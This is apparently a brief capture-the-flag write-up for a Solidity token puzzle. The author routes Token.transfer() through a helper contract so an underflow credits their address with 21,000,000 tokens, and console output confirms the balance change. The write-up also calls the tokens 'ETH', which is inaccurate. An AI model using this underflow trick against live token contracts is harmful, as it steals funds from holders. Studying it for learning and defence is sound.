Idea is to create a custom contract and call Token.transfer() from that contract so that transfer amount is deducted off of msg.sender’s balance (i.e. custom contract’s balance) and deposited into my address.

To verify transfer of ETH:
-check balance of custom contract vs. my balance before transfer:
(await contract.totalSupply()).toString()
"21000000"

(await contract.balanceOf("0x6ba166580bd6989f2cad8b5245d269b845694baf")).toString() 
"20"

-execute TokenCaller.callTransfer(address_of_Token_contract, my_address, 21000000) from Remix which calls Token.transfer()

-check again:
(await contract.balanceOf("0xda6a32014c5cce5574b02020a33bbd3a7b3c1cd5")).toString() 
"0"

(await contract.balanceOf("0x6ba166580bd6989f2cad8b5245d269b845694baf")).toString() 
"21000020"

